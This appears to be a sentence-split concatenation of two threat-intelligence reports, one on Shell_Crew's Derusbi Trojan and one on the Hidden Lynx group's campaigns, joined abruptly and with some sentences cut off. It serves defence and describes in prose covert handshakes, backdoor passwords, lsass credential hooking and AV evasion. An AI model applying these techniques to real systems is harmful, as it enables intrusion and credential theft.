If the Trojan does not receive the other necessary portions of the Trojan / C2 handshake it will transmit the following type of GET request .
The ' loginid ' that is highlighted in yellow in Figure 29 is created pseudorandomly .
This Trojan has several advanced capabilities including providing a reverse shell to the adversary , locating and decrypting usernames and passwords stored by web browsers like Internet Explorer and Firefox , uploading and downloading files , and executing additional malicious files .
Appendix 1 of this report illustrates how several variants of Trojan . Derusbi have overlapping characteristics .
Having the ability to quickly detect relationships between different variants allows the RSA IR Team to locate not just specific samples , but variants throughout an environment within the same family .
This variant contains a driver that monitors all incoming TCP connections for a secret handshake .
The handshake is simple enough to allow this variant to function even on busy web servers .
Once the handshake is received , the driver then passes control to the DLL file which contains the main functionality of the Trojan .
Characteristics of one such Trojan . Derusbi server variant can be found in Figure 30 .
The Trojan exports the functions shown in Table 2 below .
The adversary installed this Trojan by utilizing the regsvr32.exe utility , which calls the DllRegisterServer function .
This Trojan first checks the version of Windows it is running on using the GetVersionExA function , and will terminate if not on a Windows version 5.2 as shown in Figure 31 .
This versions of Windows this covers is :  Windows 2003 Server ;  Windows 2003 Server R2 ; and  Windows XP 64-bit Edition .
The Trojan then validates that it is not running on a 64-bit system by using the IsWow64Process function .
The servers where this Trojan was found during the engagement were Windows 2003 servers , confirming the Shell_Crew had created this variant of the Trojan . Derusbi to run specifically on this family of Operating Systems .
The Trojan then makes a copy of itself into the C : \Windows\System32 folder as a file named : `` msusbXXX.hlp '' , where XXX were found to be three characters picked randomly from this set of characters : abcdefghijklmnopqrstuvwxyz .
The Trojan then entrenches itself as a service named `` wuauserv '' as illustrated in Figure 32 .
Furthermore , this Trojan also drops a driver file on the system named : { 93144EB0 - 8E3E-4591-B307 - 8EEBFE7DB28F } .sys
This driver file is embedded into the DLL starting at file - offset 0x9290 .
The contents of this file are obfuscated with a 4-byte XOR key : 0xF35D882E .
Once the driver file is loaded in memory , the file is deleted from the file system .
The following registry key remains as an artifact : HKLM\SYSTEM\CURRENTCONTROLSET\ENUM\ROOT\LEGACY _ { 93144EB0 - 8E3E-4591-B307 - 8EEBFE7DB28F } .
The driver also attaches to the following network devices :  \Driver\Tcpip\Device\Ip ;  \Driver\Tcpip\Device\Tcp ;  \Driver\Tcpip\Device\Udp ; and  \Driver\Tcpip\Device\RawIp .
The driver can then monitor traffic to any existing listening TCP ports .
The driver performs the following three checks on any new TCP connections :  Ensures the payload of the first packet equals 64 bytes ;  Ensures 2nd DWORD = Inverted 1st DWORD ( i.e .
All the data in the handshake is randomly generated .
Other than the first three DWORDS ( 12 bytes ) , the rest of the data in the 64-byte handshake is irrelevant .
The structure of the handshake is shown below in Figure 34 : The malicious DLL performs the last two checks on the handshake data as well .
It then replies back with the same type of handshake .
All data is randomly generated independent of what data was received .
Figure 35 depicts a sample handshake .
The handshake is followed by a password verification step .
The structure of the data also changes from this point forward .
This sample uses password , `` pinkcomein '' .
The client Trojan service sends the password after obfuscating it with a 4-byte XOR key , which is dynamically generated and sent with the rest of the data .
The checksum is a simple addition of all the bytes prior to the obfuscation step .
Once the password has been confirmed , the communication protocol adds one additional component .
All data beyond the 3 headers is compressed using the LZO fast compression algorithm , prior to being obfuscated with the 4-byte XOR key .
The commands sent to the server also need to be compressed and obfuscated .
Figure 37 shows an example that demonstrates all these components of the communication protocol ( XOR key in this example was set to 0x00000000 to expose the next layer for demonstration purposes ) .
The commands are in binary form .
In the example shown in Figure 37 , the command is 0x10 ( which is visible even though the data is compressed ) , uninstalls the Trojan , and restores the original registry keys .
The rest of the functionality of this Trojan is typical to this family of Trojans including ; file traversal , process start / terminate , upload / download , time stomping , and self - updates .
This section contains the technical analysis of several secondary tools that are favored by Shell_Crew .
The secondary tools are programs that facilitate lateral movement , harvesting of credentials , or allow for additional channels of communication .
During recent engagements involving Shell_Crew , the secondary tools were introduced into the environment during the early stages of a compromise indicating that these are the preferred tools of this group .
Shell_Crew also employs several additional tools that are commonly used by other threat groups and will not be covered in this report .
One of the preferred tools used by Shell_Crew during a recent incident was a multi - purpose tool typically named ' notepad.exe ' , but also found named ' inetinfo.exe ' or ' mszip.exe ' .
The collected sample of this tool was written in .NET
This tool does not have a built - in C2 address , however the code does support this feature .
This tool requires arguments to be passed to it in order to perform activities .
One of the most commonly used commands by the adversary was the proxy like functionality of this tool as show below in Figure 38 .
In this example , the proxy functionality of notepad.exe allowed the adversary to proxy their traffic to the external site '' upload.msdnblog.com '' through internal IP address 10.192.59.10 on port 80 .
In order to decompile notepad.exe , the code was deobfuscated using a publicly available tool called `` de4dot '' .
Once the code had been deobfuscated , notepad.exe could be decompiled for analysis using the tool `` Reflector '' .
The RSA IR team was able to review the functionality of this tool and a complete list of the available parameters is provided in Table 3 .
During testing it was found that when this file was executed with no arguments , the tool performs the following actions : 1 .
The tool would hash the string `` alice'srabbithole '' ( MD5 : 75BAA77C842BE168B0F66C42C7885997 ) 2 .
The tool then checks if the resource shown in Figure 40 starts with the hash value obtained in step 1 ( in this case there is a match ) .
If the result of step 2 is true , the Trojan exits without doing anything else .
It is in this resource that the Trojan would otherwise find an IP address and port number to connect .
The resource would have the format shown in Figure 41 : The first two bytes of the resource will be a hexadecimal value representing the length of the Base64 encoded data that follows .
The obfuscated data is first Base64 decoded , then XOR - ed with 0xAA .
The obfuscated data is meant to be an IP address followed by a port number , separated by a colon `` : '' .
The following figure shows the functions from the code .
This tool can be executed in various ways depending on the arguments provided .
Table 3 shows a complete this of the discovered parameters .
On a compromised Windows system , credentials can be harvested in a variety of ways :  Hash Dumping  Keystroke logging  MSGINA man - in - the middle  Hooking Authentication Functions One such example that was observed during a recent engagement was a DLL file that Shell_Crew had injected into the lsass.exe process of a server to harvest credentials .
The characteristics of this DLL file are shown in Figure 43 .
Once this DLL is injected into the lsass.exe process , it hooks the LsaApLogonUserEx2 function of msv1_0.dll .
This function is called during various authentication situations such as interactive or network logons , including when the RunAs option is used .
All credentials are saved in plaintext under : c : \windows\system32\desktop.ini .
A sample of harvested credentials that would be stored in the desktop.ini file is shown in Figure 44 .
The below sections outline information and detection capabilities that can assist with identification of activity or tools associated with Shell_Crew .
Additionally , the RSA IR Team has included a digital appendix along with this report that contains content that can be integrated into Security Analytics , the Enterprise Compromise Assessment Tool ( ECAT ) , or other security tools for rapid detection and visibility of indicators associated with Shell_Crew within an enterprise environment .
Web server logs , if available , can reveal the intrusion vector .
Sometimes tools or Trojans have also been found at the root of the C : drive .
Additionally , they ' ve used the Sysinternals tool psexec.exe to execute a file remotely , sometimes automated via a VBS script .
Host based signatures can be used in conjunction with this methodology to allow for improved efficiency .
The Yara signatures listed below are currently used by the RSA IR Team to locate some malicious files specific to this group .
A tool like ECAT can utilize these signatures to scan memory of systems across a network .
Similarly any altered files , like System.web.dll , should be deleted and replaced with a clean copy of the original Microsoft file .
Here are some password seen used by Shell_Crew : - www.google.com - www.google.com ! 123 - fuckalnt76yiuudg While standard network signatures will detect some of the Trojans and tools used by Shell_Crew , the Trojan . Derusbi samples detailed in this report were designed to avoid detection by employing a proprietary handshake derived from pseudorandom values dynamically calculated at runtime .
The digital appendix provided with this report contains several Security Analytics parsers that can assist in the detection of these Trojan . Derusbi handshakes and additional variants related to these samples .
Once enabled , these parsers will generate meta entitled `` derusbiserver_handshake '' or '' derusbi_variant '' in the Risk . Warning category within Security Analytics .
Also included within the digital appendix are feeds that can be imported into Security Analytics for detection of potential Shell_Crew activity .
These feeds will alert users if there are any machines on the network communicating with malicious IP Addresses or URLs linked to Shell_Crew identified domains or IP 's within this report .
Once enabled , these feeds will generate meta entitled `` derusbi_domain_sep201 '' 3 or `` derusbi_ip_sep2013 '' in the Risk . Warning category within Security Analytics .
The hashes that are referenced in the Malicious Files and Tools section of this report are also available in the digital appendix .
The format of the files in the digital appendix can be imported directly into ECAT to begin looking for the hashes across systems within the environment .
By default , ECAT is also able to detect some of the malicious behavior that is exhibited by the samples detailed in this report .
The below examples are provided to demonstrate how potential Shell_Crew activity can be identified using standard analysis capabilities via the ECAT Server .
Figure 45 is a screenshot where ECAT detected a suspicious outbound connection .
The screen shot depicts the attempted connections of the Trojan . Derusbi sample that was detailed earlier in this report .
With this information , ECAT can be used to quickly determine if any other systems on the network had executable files that were actively beaconing to the same location .
The same malicious file seen above was also flagged as suspicious by ECAT because it was entrenched in an ' autorun ' location within the system 's registry .
The screen shot in Figure 46 below depicts the alert provided by ECAT .
Additionally , the RSA IR Team observed that Shell_Crew will time stomp ( alter a files Created Date and Time Stamp ) to hinder forensic analysis .
By default , ECAT has the ability to parse a system 's MFT and display both the File Name Attribute information and Standard Information Attribute for a file .
The screen shot below shows an instance where the files had been time stomped .
The files were purportedly created on the compromised systems in 2005 , when in actuality they had been placed on the systems in 2012 .
The RSA IR Team uses Yara Signatures like the ones provided in the digital appendix to detect malicious files present on systems and running in memory .
They 're also used to detect new variants that are being tested by adversaries using open source tools like VirusTotal .
The RSA IR Team has observed that Shell_Crew will submit numerous samples of a Trojan family to VirusTotal in an attempt to determine which AV vendors will detect the malicious files .
Shell_Crew will make small changes to the code and how the binary is compiled until a particular AV vendor does not detect the sample .
Detecting these variants using Yara Signatures allows the RSA IR Team to update and alter signatures , analyze new variants , and become aware of new C2 nodes before the samples are used against targeted organizations .
This information is then added to existing content in Security Analytics and ECAT .
Figure 48 is a graph that depicts where variants of a sample were submitted numerous times , each time being detected by different AV products .
All hashes , IP Addresses , and domains discussed within this report as associated with Shell_Crew can be found in the attached Digital Appendix .
This report detailed techniques and tools that are frequently used by an advanced adversary being referred to by the RSA IR Team as Shell_Crew .
The information delivered in this report was provided so organizations can turn the data into actionable intelligence , for detection or prevention of this advanced threat .
As of the date of this report , Shell_Crew continues to be a formidable threat group that is actively attacking organizations .
In instances where Shell_Crew has already breached an organization , the RSA IR Team has observed that the adversary will aggressively attempt to regain a foothold once their Trojans have been eradicated and communication channels severed .
If any of their existing backdoors or Web shells remain active in the environment , Shell_Crew will begin to redeploy other tiers of malware that communicate through different channels , which may use different protocols and obfuscation techniques .
The RSA IR Team has observed instances where Shell_Crew has persisted in enterprises for years before they are detected .
During that time , Shell_Crew updated or replaced existing malicious backdoors , continued to map the enterprise while installing Web shells or poisoning existing web pages , and performed internal reconnaissance of victims to determine what AV and security products are being deployed in these environments .
These tenacious approaches make it difficult for an under resourced internal security team to detect , and furthermore , eradicate this adversary .
The RSA IR Team will continue to track the TTPs used by this group and distribute information about this and other adversaries .
The information that is provided in the digital appendix and throughout the report can be ingested directly into RSA products or used agnostically with other products .
If you have any questions about this emerging threat profile or the RSA Incident Response Team , please send an email to FirstResponse @ rsa.com or contact your RSA Account Representative .
Page 37 The below images illustrate the different relationships between the Trojan . Derusbi samples that were listed in the Malicious Files Section .
The XOR keys in blue , were used to decode the Configuration data that is used by the sample .
The XOR keys in red were used to decode the embedded driver files .
The illustration below shows relationships between the Trojan . Notepad samples that were listed in the Malicious Files / Tools Section .
These samples are grouped by file description .
Below is a list of the files and folders contained within the ShellCrew_Digital_Appendix .
All content should be tested before rd full integration into SA , ECAT , or 3 party tools to prevent any adverse effects from unknown environmental variables .
The Hidden Lynx group is a professional team of attackers with advanced capabilities .
They were responsible for the compromise of security firm Bit9 's digital code - signing certificate which was used to sign malware .
The Bit9 breach was part of the much larger VOHO campaign and that campaign was just one of many operations undertaken by the group over the last four years .
The group likely offers a `` hackers for hire '' operation and is tasked with retrieving specific information from a wide range of corporate and government targets .
They are a highly efficient team who can undertake multiple campaigns at once , breach some of the world 's best - protected organizations and can change their tactics quickly to achieve their goal .
They usually attack using multiple customized Trojans designed for specific purposes .
Backdoor . Moudoor is used for larger campaigns and has seen widespread distribution while Trojan . Naid is reserved for special operations against high value targets .
The group uses cutting - edge attack techniques which makes this team stand out from other major attack groups .
This paper takes an in - depth look at the Hidden Lynx group , their targets and their motivations .
It will look into their capabilities and attack strategies through their attack campaigns including the Bit9 incident .
A well - known group with affiliations to `` Operation Aurora '' managed to break into Bit9 's network using an SQL injection attack .
In February 2013 , Bit9 released a statement revealing that in July 2012 , their network had been compromised by a malicious third - party .
A well - known group named Hidden Lynx with affiliations to `` Operation Aurora '' managed to break into Bit9 's network using an SQL injection attack .
These Trojans made their way into the defense industrial sector .
However , the Bit9 compromise was only a small piece of a much larger watering - hole operation known as the VOHO campaign , which impacted hundreds of organizations in the United States .
Further , the VOHO campaign itself was just one campaign of many that is attributable to this incredibly prolific group .
Each campaign is designed to access information in governmental and commercial organizations that tend to operate in the wealthiest and most technologically advanced countries in the world .
The Hidden Lynx group has been in operation since at least 2009 and is most likely a professional organization that offers a `` hackers for hire '' service .
They have the capability to attack many organizations with concurrently running campaigns .
They operate efficiently and move quickly and methodically .
Based on these factors , the Hidden Lynx group would need to be a sizeable organization made up of between 50 and 100 individuals .
The members of this group are experts at breaching systems .
They engage in a two - pronged strategy of mass exploitation and pay - to - order targeted attacks for intellectual property using two Trojans designed specifically for each purpose : • Team Moudoor distributes Backdoor . Moudoor , a customized version of `` Gh0st RAT '' , for large - scale campaigns across several industries .
The distribution of Moudoor requires a sizeable number of people to both breach targets and retrieve the information from the compromised networks .
This Trojan was leveraged for a special operation during the VOHO campaign and is probably used by a specific team of highly skilled attackers within the group .
This Trojan was also found as part of `` Operation Aurora '' in 2009 .
Much of the attack infrastructure and tools used during these campaigns originate from network infrastructure in China .
The Hidden Lynx group makes regular use of zero - day exploits and has the ability to rework and customize exploits quickly .
They are methodical in their approach and they display a skillset far in advance of some other attack groups also operating in that region , such as the Comment Crew ( also known as APT1 ) .
The Hidden Lynx group is an advanced persistent threat that has been in operation for at least four years and is breaking into some of the best - protected organizations in the world .
With a zero - day attack already under their belt in 2013 , they continue to operate at the leading edge of targeted attacks .
The diverse set of targets from a variety of sectors would indicate that this group is not focused on any one specific task .
Since November 2011 , hundreds of organizations worldwide have been targeted by the Hidden Lynx group .
These organizations have remained relatively consistent during this time period .
The group targets organizations operating in both the commercial sector and within all levels of government .
The diverse set of targets from a variety of sectors would indicate that this group is not focused on any one specific task .
The group manages concurrent campaigns in attacks that are global in nature .
The Hidden Lynx group has most recently conducted attacks against specific organizations in South Korea and has a long history of attacking the defense industrial sector of Western countries .
The top 10 organizations categorized by the verticals they belong to are shown in Figure 1 .
The most targeted countries / regions are shown in Figure 2 .
This broad range of targeted information would indicate that the attackers are part of a professional organization .
They are likely tasked with obtaining very specific information that could be used to gain competitive advantages at both a corporate and nation state level .
It is unlikely that this organization engages in processing or using the stolen information for direct financial gain .
Their mode of operation would suggest that they may be a private organization of `` hackers for hire '' , who are highly skilled , experienced professionals whose services are available for those willing to pay .
The financial services sector has been identified as the most heavily targeted industry overall .
There is a tendency to target specific companies within this sector .
Investment banks and asset management agencies account for the majority of organizations targeted within this industry .
The absence of certain types of financial institutions , such as those operating as commercial banks , clearly indicates that the attacks are focusing on specific areas .
The organizations involved would have expertise in large corporate deals , such as confidential information on upcoming mergers and acquisitions , which could be used to gain a competitive edge .
Targeting this sector in such a concentrated fashion could provide invaluable information when negotiating large takeovers or trading shares on the stock exchange .
Attacks on the financial sector are not limited to investment banks .
Stock trading firms and one of the world 's largest stock exchanges have been subjected to attacks from this group .
The Hidden Lynx group has also undertaken indirect attacks through the supply chains .
Organizations that supply hardware , secure network communications and services specific to the financial sector have also come under attack .
There is almost certainly a financial motivation behind these attacks .
In attacks that have targeted all levels of government from local to national level , this group has repeatedly attempted to infiltrate these networks .
Attacks against government contractors and , more specifically , the defense industry indicate that the group is in pursuit of confidential information and suggests that the group had been working for nation states .
Targeting advanced technologies in specific areas such as aerospace would be useful in order to close technological gaps or gain knowledge of the advanced capabilities of other nation states .
Attacks on organizations that operate in the Internet services space can provide a wealth of valuable information .
The group had affiliations to `` Operation Aurora '' ( See appendix for more details ) , a campaign that targeted a number of organizations including software manufacturers and defense contractors .
More recently , Microsoft claimed that the target was databases containing emails marked for court order wiretaps .
They believe that these attacks were counter - intelligence operations , activities that would provide benefits at a nation state level .
The group 's tools , tactics and procedures are innovative and typically cutting - edge .
They use custom tools and techniques that they tailor to meet their objectives and maximize their chance of success .
They attack public- facing infrastructure and have been observed installing highly customized Trojans that are purpose - built for stealth .
They engineered one of the most successful watering - hole attacks to - date .
They also undertake spear- phishing attacks and hack supply chains in order to distribute their custom Trojans .
This is an established team with years of experience .
They are well resourced and highly skilled .
The Hidden Lynx group 's advanced capabilities are clearly demonstrated in three major campaigns .
In the VOHO campaign , they showed how they could subvert Bit9 's established trust models .
In the FINSHO campaign , they managed to get advanced knowledge of a zero - day exploit and in the SCADEF operation , they undertook supply chain attacks to succeed in their campaign .
The team can adapt rapidly to counter - measures that would otherwise hinder the success of a campaign .
The attack on Bit9 showed how the group could bypass solid trust protection models to get to their targets .
However , this attack was only a small part of the larger VOHO campaign , where the group proved how quickly they can adapt and change their tactics in the face of new and unforeseen obstacles .
Bit9 is a security company headquartered in Waltham , Massachusetts .
As an alternative to traditional signature - based antivirus solutions , Bit9 offers a trust - based security platform that runs off of a cloud - based reputation service combined with policy - driven application control and whitelisting to protect against cyberthreats .
As a result , it is difficult for a malicious third - party to install an untrusted application , such as a remote access Trojan ( RAT ) , onto a system that is adequately protected with the Bit9 platform .
Undaunted by this , the elite Hidden Lynx group took up the challenge .
On February 8 2013 , Bit9 released details revealing that a malicious third - party had gained access to one of their digital code - signing certificates .
During this incident , a number of Trojans and malicious scripts were signed .
In a follow up post on February 25 , more details of the attack emerged .
In July 2012 , more than six months earlier , a malicious third - party gained access to their network using an SQL injection attack .
Due to an operational oversight , a public - facing server that was n't protected with the Bit9 platform allowed the attackers to gain unauthorized access .
The attackers installed Backdoor . Hikit , a Trojan that provides extremely stealthy remote access to compromised systems .
This highly customized Trojan is typically installed onto servers in the victims ' DMZ , which was the case at Bit9 .
Credentials for another virtual machine were then stolen .
These were used Bit9 's digital code - signing certificates .
The attackers used this code - signing infrastructure to sign thirty - two malicious files .
Symantec telemetry shows some of these files have been present within select organizations in the United States defense industrial sector .
The signing of these files is significant , since they could then be used to circumvent the trust protection model offered by the Bit9 platform .
The Trojans signed include variants of Backdoor . Hikit ( the remote access Trojan used in the initial compromise ) and another RAT called Trojan . Naid .
Some malicious attack scripts were also signed .
Each Trojan has a specific purpose .
Backdoor . Hikit was used to target public - facing infrastructure while Trojan .
Naid was used to perform highly targeted attacks through email and watering - holes .
Bit9 was alerted to the compromise in January 2013 and took immediate containment steps such as revoking the digital signature and reaching out to their entire customer .
According to Bit9 , the attacks that followed were not financially motivated , but rather were an attempt to access information .
On Bit9 's own admission , three customers were impacted .
In conjunction with the Bit9 compromise , the Hidden Lynx group had another significant campaign well under way .
They had just concluded phase one of the VOHO campaign , a watering - hole operation orchestrated to attack organizations in the Boston , Massachusetts area – it was a likely a distribution vector for the newly signed files .
The VOHO campaign , first publicized by RSA , is one of the largest and most successful watering - hole attacks to date .
The campaign combined both regional and industry - specific attacks and predominantly targeted organizations that operate in the United States .
In a rapidly spreading two - phase attack , which started on June 25 and finished July 18 , nearly 4,000 machines had downloaded a malicious payload .
These payloads were being delivered to unsuspecting victims from legitimate websites that were strategically compromised .
This watering - hole infection technique was quite innovative at the time .
In a watering - hole attack , the attacker compromises a legitimate website that the target uses and trusts .
The attacker then lies in wait for the target to visit the compromised site in order to infect them .
The scale and targeted nature of the VOHO campaign set it apart from watering - hole attacks observed in the past .
The group first adopted this technique in December 2011 when an exploit or the Oracle Java SE Rhino Script Engine Remote Code Execution Vulnerability ( CVE-2011 - 3544 ) was leveraged to distribute their payloads .
As a result of their success , many other strategic compromises have been adopted by other attack groups , as seen in a notable attack targeting iOS developers earlier in 2013 which impacted employees at Facebook , Apple and Twitter .
In the VOHO campaign , ten legitimate websites were strategically compromised .
The attackers carefully selected these websites based on the likelihood that the intended target ( s ) would visit them during the exploit delivery phase .
The attackers likely pre - determined who visited the watering - hole in advance of the distribution phase of attack .
This could easily be achieved by examining the access logs of compromised Web servers .
The categories of websites compromised were both regional and industry - specific in nature and targeted the following key areas illustrated in Figure 5 .
The VOHO watering - hole distributed remote access Trojans in two phases .
In phase one of the attack , an Internet Explorer zero - day vulnerability , the Microsoft XML Core Services CVE-2012 - 1889 Remote Code Execution Vulnerability ( CVE-2012 - 1889 ) , was leveraged .
On July 10 , Microsoft introduced the patch for CVE-2012 - 1889 and activity at the watering - hole ceased .
This appears to have been a clever decision on behalf of the attackers .
If they continued to deliver the exploit , they risked detection and would have hurt their chances of retaining access to the watering - hole for phase two of the campaign .
Within six days , phase two of the distribution began , this time using a malicious Java applet exploiting the Oracle Java SE CVE-2012 - 1723 Remote Code Execution Vulnerability ( CVE-2012 - 1723 ) .
This Java exploit was patched at the time .
Having already used two zero - day exploits in quick succession ( the first zero - day exploit was used in the GOTHAM campaign in May 2012 , see appendix for more details ) , the Hidden Lynx group may not have had another one at their disposal .
The timeline of activity at the watering - hole is shown in Figure 6 .
In each phase of the attack , two Trojans were being distributed at different intervals .
The customized version of `` Gh0st RAT '' , Backdoor . Moudoor , saw large - scale distribution in comparison to Trojan . Naid , which was used more selectively in these attacks .
Before being used in the second phase of the attack , Trojan . Naid was signed with the Bit9 certificate .
Moudoor was never observed during the attack on Bit9 , which could indicate that two separate teams are at work here .
With Moudoor and Naid using different command - and - control ( C & C ) servers , each team could work independently on alternative objectives .
The discovery of the Naid C & C would also be less likely in comparison to Moudoor 's , as its large - scale distribution would inevitably create more noise as it continued to impact many organizations .
During this campaign , Team Naid had a very specific objective – to gain access to information from organizations operating in the defense industrial sector .
An unsigned version of Naid was distributed to select victims within the defense industrial sector during phase one until Microsoft supplied a patch for CVE-2012 - 1889 on July 10 .
It may have been during this phase of the attack when the team realized the information they sought was held by organizations protected by Bit9 .
As the team found it difficult to compromise Bit9-protected computers and had no viable exploit for distribution , their immediate objective focused on Bit9 's digital code - signing certificate .
By July 13 , just a few days after they started their attacks on Bit9 , they obtained the Bit9-signed Naid .
By the next day , they had built a viable Java exploit to distribute their Trojan .
Armed with the newly - signed Trojan and delivery vehicle , the group resumed malicious activity at the watering - hole for three days from July 16 .
It was during this period that three organizations protected with the Bit9 platform were successfully compromised .
In this campaign , Naid was specifically reserved for special operations against high value targets .
Team Naid 's objective was narrow and focused and the team aimed to limit Naid 's exposure .
The sophistication of the overall attack is typical of attackers with a very high pedigree .
The team is clearly highly skilled ; they operate methodically and can switch objectives at a moment 's notice .
They rapidly adapted to external factors that were hindering their specific objective and pursued a difficult prize - the Bit9 certificate - in order to achieve their overall goal .
The distribution of Moudoor during this campaign was on a much larger scale .
Organizations operating in the financial sector , all levels of government ( local and federal ) , healthcare , education and law were impacted during this campaign .
There is a wealth of sensitive information within these organizations which would be of interest to both nation states and entities that would benefit from information as a result of corporate espionage attacks .
The top distinct infections per organization type are shown in Figure 8 .
A campaign distributing Moudoor on such a large scale would require a sizeable team to operate and maintain remote access to these compromised computers .
The breach phase of the operation could easily be handled by a smaller team , which then passes control to a larger team of operators who can traverse networks and retrieve the information they are tasked with gaining access to .
To efficiently attack this many organizations concurrently would require an equally large number of operators .
These Trojans require manual operation so it 's conceivable that tens if not hundreds of operators would be used post - breach to process and handle the stolen data .
The VOHO campaign is one of a number of campaigns attributed to this group over the last four years .
It showed how quickly the group could change their strategy and the lengths they would go to get to their targets .
The fact that the Bit9 code - signing certificate breach was only a small part of this campaign shows how adaptable and determined the group is .
The group is highly organized and can gain advanced access to zero - day vulnerabilities .
In February , the Hidden Lynx group used this advanced knowledge to take advantage of the Oracle Java SE CVE-2013 - 1493 Remote Code Execution Vulnerability ( CVE-2013 - 1493 ) to attack Japanese targets in the FINSHO campaign .
Within two days of Bit9 's blog post on February 25 , the attackers began distributing Moudoor and Naid in a campaign that leveraged CVE-2013 - 1493 .
Interestingly , the C & C server configured in Naid ( 110.173.55.187 ) was also configured in a sample found in the Bit9 incident .
Although the version used against Bit9 was not observed elsewhere in the wild , the group 's methodical approach would indicate that a similar campaign may have been intended or that Trojan .
The timeline for exploit development and distribution is illustrated in Figure 9 .
According to Oracle 's blog , CVE-2013 - 1493 was reported to them on February 1 , the same day that class files exploiting it were added to MightDev.jar shown in Figure 10 .
In past Java exploits used by this group , the code was already public knowledge and a patch was already available for the software .
In this case , they gained advanced knowledge from an unknown source - a source with early access to the exploit conditions , possibly on the same day as Oracle .
Oracle released the fix for CVE-2013 - 1493 on March 4 .
Figure 11 illustrates the relationship between FINSHO and the Bit9 incident through the shared C & C server used in both Naid configurations .
Alternate C & C servers and separate websites for distribution provide further evidence that there are distinctions between how these teams operate .
The Hidden Lynx group continued to attack the defense industry post - VOHO .
In another campaign named SCADEF , manufacturers and suppliers of military - grade computers were observed installing a Trojanized Intel driver application .
The attackers bundled this Intel driver application with variants of Backdoor . Moudoor using a popular Chinese archiving application called Haozip .
The attackers likely compromised a legitimate download of this driver application from a non - reputable source but the true source was never discovered in this investigation .
The technique is another avenue into hardened networks of interest .
They attack not only hardware suppliers , but contractors that may access these network during their course of work .
The group seeks out the weakest link in the chain and simply lies in wait .
In these specific attacks , they simply wait for a shipment of compromised computers to be installed into the targeted network .
Unique detections observed for these Trojanized applications are presented in Figure 12 .
The VOHO , FINSHO and SCADEF campaigns each showed how efficient and adaptable the group is when focusing on their targets .
They use a wide range of advanced attack methods and change their strategy when required to carry out each operation .
These three campaigns are only some of the operations undertaken by the Hidden Lynx group , making them a credible threat to several industries .
From the evidence seen , it 's clear that Hidden Lynx belongs to a professional organization .
Cyberespionage campaigns are becoming increasingly common , with countless threat actors attempting to gain footholds into some of the best - protected organizations .
These attacks are becoming increasingly sophisticated .
The capabilities and tactics used by these threat actors vary considerably .
The Hidden Lynx group is capable of undertaking focused attacks against niche targets and running large - scale campaigns targeting multiple organizations on a global scale .
They have seen action in numerous campaigns since 2009 and repeatedly attack their targets with cutting - edge techniques .
They quickly adapt to security counter - measures and are highly motivated .
They are one of the most well - resourced and capable attack groups in the targeted threat landscape .
From the evidence seen , it 's clear that Hidden Lynx belongs to a professional organization .
They operate in a highly efficient manner .
They can attack on multiple fronts .
They use the latest techniques , have access to a diverse set of exploits and have highly customized tools to compromise target networks .
Their attacks , carried out with such precision on a regular basis over long periods of time , would require a well - resourced and sizeable organization .
They possess expertise in many areas , with teams of highly skilled individuals who can adapt rapidly to the changing landscape .
This team could easily consist of 50 - 100 individuals .
This level of resources would be needed to build these Trojans , maintain infection and C & C infrastructure and pursue confidential information on multiple networks .
They are highly skilled and experienced campaigners in pursuit of information of value to both commercial and governmental organizations .
The incident in Bit9 , which ultimately led to successful compromises of hard - to - crack targets during the VOHO campaign , only serves to highlight this fact .
The evolving targeted attack landscape is becoming increasingly sophisticated .
As organizations implement security counter - measures , the attackers are adapting at a rapid rate .
With a growing number of threat actors participating in these campaigns , organizations have to understand that sophisticated attackers are working hard to bypass each layer of security .
It 's no longer safe to assume that any one solution will protect a company 's assets .
A variety of solutions need to be combined and , with a better understanding of the adversary , tailored to adequately protect the information of most interest to the attackers .
The Hidden Lynx group 's mission is large and they 're targeting a diverse set of information .
The frequency and diversity of these attacks would indicate that the attackers are tasked with sourcing information from many organizations .
These tasks are likely distributed within the team .
The group 's goal is to gain access to information within organizations in some of the wealthiest and most technologically advanced countries across the globe .
It is unlikely that they can use this information for direct financial gain , and the diversity of the information and number of distinguishable campaigns would suggest that they are contracted by multiple clients .
This leads us to believe that this is a professional organization that offers a `` hackers for hire '' service .
The worrying knock - on effect of this group 's activities is that other threat actors are learning and adopting their techniques .
The Hidden Lynx group is not basking in their past glories , they are continuing to refine and streamline their operations and techniques to stay one step ahead of their competition .
Organizations that are being attacked on multiple fronts need to better protect the information that is most valuable to them .
We expect these attackers to be involved in many more high profile campaigns in the coming years .
They will continue to adapt and innovate .
They will continue to provide information servicing interests at both a corporate and state level .
Groups like Hidden Lynx are certainly winning some of the battles , but as organizations gain a better understanding of how these groups operate , they can take steps to help prevent their most valuable information from falling into attackers ' hands .
The three campaigns that have already been examined in detail are only a snapshot of the group 's activities .
Since the time they adopted Moudoor in late 2011 , persistent attacks against organizations across the globe have been occurring on a regular basis , even to this day .
These attackers pioneered the watering - hole technique , however they can also fall back to more traditional methods of attack , such as spear - phishing emails , supply chain attacks and Trojanized software updates .
Since 2011 , the Hidden Lynx group has leveraged five browser - based exploits for payload distribution , three of which were zero - day exploits .
The list of browser - based exploits used by the Hidden Lynx group since the introduction of Moudoor is presented in Table 1 .
In the first half of 2012 , there was a particularly high distribution of Moudoor .
There was a peak in June / July as a result of the VOHO campaign which is evident in the graph shown in Figure 13 .
There is also a peak at the beginning of the year which is a result of another high distribution campaign called WSDHEALTHY .
This campaign , along with some other notable attacks and techniques , will be discussed in the following sections .
This was a two - phase attack which saw Team Naid and Team Moudoor share C & C infrastructure ( 219.90.117.132 ) in a smaller campaign that infected organizations in the following industries : • Financial services • Information communications technology • Government • Marketing • Information technology • Aerospace / defense • Energy Many of the industries targeted in this campaign are similar to those targeted in the VOHO campaign , so this could be considered as a pre - cursor to that campaign .
Similar to VOHO , this was a two - phased attack that leveraged two Internet Explorer zero - days for distribution ( CVE-2012 - 1875 and CVE-2012 - 1889 ) .
Similar to VOHO , as Microsoft patched CVE-2012 - 1875 , the attackers halted distribution .
This prevented any unnecessary suspicious activity from being identified that could impact future activity from the compromised website .
A timeline for this activity is presented in Figure 14 .
Sharing C & C infrastructure could indicate that both teams were working closely together and may have divided up the effort during this campaign .
During phase two of this campaign , VOHO began .
The Hidden Lynx group is clearly resourced to operate and maintain distribution and C & C infrastructure across multiple campaigns .
This level of organization requires discipline at multiple levels within the group .
This is not a small group of elite hackers – this is a well - organized professional organization .
One campaign that rivals VOHO in terms of size is WSDHEALTHY .
This is the first campaign where we see the group using Naid and Moudoor together sharing infrastructure and the first links to the Bit9 incident start to emerge .
The Hidden Lynx group began using watering - hole attacks as early as December 2011 .
